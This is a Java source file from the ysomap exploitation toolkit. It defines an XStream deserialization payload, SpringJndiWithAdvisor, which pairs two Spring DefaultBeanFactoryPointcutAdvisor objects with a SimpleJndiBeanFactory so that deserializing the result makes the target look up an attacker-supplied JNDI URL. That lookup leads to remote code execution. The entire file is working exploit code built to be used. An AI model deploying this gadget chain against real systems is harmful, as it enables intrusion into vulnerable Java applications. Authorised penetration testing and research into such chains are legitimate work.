package ysomap.payloads.xstream;

import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import ysomap.bullets.Bullet;
import ysomap.bullets.spring.SpringJndiBullet1;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;

/**
 * @author wh1t3P1g
 * @since 2020/8/26
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.XSTREAM })
@Dependencies({"spring-aop && spring-context"})
@Require(bullets = {"SpringJndiBullet1"}, param = false)
public class SpringJndiWithAdvisor extends XStreamPayload<Object> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof SimpleJndiBeanFactory;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return SpringJndiBullet1.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        String jndi = bullet.get("jndiURL");
        DefaultBeanFactoryPointcutAdvisor advisor1 = new DefaultBeanFactoryPointcutAdvisor();
        advisor1.setAdviceBeanName(jndi);
        advisor1.setBeanFactory((SimpleJndiBeanFactory)obj);
        DefaultBeanFactoryPointcutAdvisor advisor2 = new DefaultBeanFactoryPointcutAdvisor();
        advisor2.setAdviceBeanName(jndi);
        advisor2.setBeanFactory((SimpleJndiBeanFactory)obj);
//        advisor.setAdviceBeanName(bullet.get("jndi"));
//        advisor.setBeanFactory((SimpleJndiBeanFactory)obj);
        return PayloadHelper.makeMap(advisor1, advisor2);
    }
}
